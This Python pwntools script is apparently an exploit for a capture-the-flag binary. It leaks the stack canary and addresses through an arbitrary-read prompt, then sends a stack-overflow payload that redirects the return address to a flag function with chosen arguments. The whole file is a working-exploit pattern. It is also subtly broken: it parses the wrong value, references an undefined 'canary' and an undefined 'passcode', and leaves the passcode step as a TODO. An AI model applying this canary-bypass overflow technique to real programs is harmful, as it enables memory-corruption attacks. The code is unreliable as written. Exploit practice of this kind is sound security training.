from pwn import *

context.log_level = "debug"
binary = "./patched"

r = process(binary)

# Get current function addr in .text
r.recvuntil(b"Therefore, UwU is good enough to let you know you are in ")
uwu_main_address_str = r.recvline().split(b"now")[0].strip()
print(f"UwU main address string: {uwu_main_address_str}")
uwu_main_address = int(uwu_main_address_str, 16)
uwu_main_address_disass = 0xe27
print(f"UwU main address: {uwu_main_address}")  # 0xe27 => 0x55ca6ba00e27

# Get current stack address through uwu_var
uwu_var_str = r.recvline().split(b"and UwU is in ")[1].split(b"\n")[0]
print(f"UwU var string: {uwu_var_str}")
uwu_var_address = int(uwu_main_address_str, 16)

rbp = uwu_var_address + 0x70
canary_address = rbp - 0x8

r.recvuntil(b"* Please enter a choice (1:Yes, 2:Yes): ")
r.sendline(b"1")

r.recvuntil(b"* Please enter an address e.g. 0x7fffdeadbeef: ")
canary_address_hex = hex(canary_address)
print(f"Canary address: {canary_address_hex}")
canary_address_hex_bytes = bytes(canary_address_hex, "utf-8")
print(f"Canary address hex bytes: {canary_address_hex_bytes}")
r.sendline(canary_address_hex_bytes)

address_contents_str = r.recvline().split(b"That address contains ")[1].split(b"\n")[0]
address_contents = int(address_contents_str, 16)
print(f"Contents of address: {hex(address_contents)}")
canary_contents = address_contents
print(f"Canary contents: {hex(canary_contents)[2:]}")
print(f"Canary contents (p64): {p64(canary_contents)}")
print(f"Canary contents: {canary_contents}")


r.recvuntil(bytes("Then, can you create some UwU for UwU? ⁄(⁄ ⁄•⁄ω⁄•⁄ ⁄)⁄", "utf-8"))

# rbp+0x2012c5 (0x2020ec / 0x5555556020ec) => passcode
# (0xc60 / 0x555555400c60) => UwU_flag
# rbp+0x28 => arg11
# rbp+0x18 => arg8
# rbp+0x10 => arg7
# rbp+0x8 => old rbp / rip
# rbp+0x0 (0xe27 / 0x555555400e27) => return address / old rbp
# rbp-0x8 => canary
# rbp-0x60 => buffer[80]
# rbp-0x70 => UwU[8]
# rbp-0x78 => ptr
# rbp-0x80 => choice[2]
# (0xfaf / 0x555555400faf) => main


old_rip = rbp + 0x8

arg7_address = rbp + 0x10
arg8_contents = 0xdeadbeef
arg8_address = arg7_address + 0x8
arg11_contents = 0xbeefdead
arg11_address = arg8_address + 0x8 * (11 - 8)

UwU_flag_address_disass = 0xc60
UwU_flag_address = uwu_main_address - uwu_main_address_disass + UwU_flag_address_disass
print(f"UwU flag address: {hex(UwU_flag_address)}")

buffer_size = 80
UwU_size = 8
choice_size = 2
canary_size = abs(rbp - canary)

# UwU_payload = b"UwU" + b"" * (UwU_size - len(b"UwU"))
# choice_payload = b"1" + b"\x00" * (choice_size - len(b"1"))
# ptr_payload = b"\x00" * 8

buffer_payload = b"UwUUwUUwU" + b"a" * (0x60 - 0x8 - len(b"UwUUwUUwU"))
canary_payload = p64(canary_contents) + b"\x00" * (canary_size - len(hex(canary_contents)))
rbp_payload = b"b" * 8
old_rip_payload = p64(UwU_flag_address)
args_payload = b"c" * (arg8_address-arg7_address) + p64(arg8_contents) + b"d" * (arg11_address-arg8_address) + p64(arg11_contents)

print(f"Buffer payload ({len(buffer_payload)}): {buffer_payload}")
print(f"Canary payload ({len(canary_payload)}): {canary_payload}")
print(f"RBP payload ({len(rbp_payload)}): {rbp_payload}")
print(f"Old RIP payload ({len(old_rip_payload)}): {old_rip_payload}")
print(f"Args payload ({len(args_payload)}): {args_payload}")

payload = buffer_payload + canary_payload + rbp_payload + old_rip_payload + args_payload

print(f"Payload: {payload}")

r.sendline(payload)


# TODO: calculate passcode from
# srand(TIME(null))
# rand() % 1000000
# passcode_address_disass = 0x2020ec  # pwngd disass main
# passcode_address = uwu_main_address - uwu_main_address_disass + passcode_address_disass
# passcode_address_hex = hex(passcode_address)
# print(f"Passcode address: {passcode_address_hex}")


r.recvuntil(b"* Please enter the passcode: ")
r.sendline(passcode)

r.interactive()
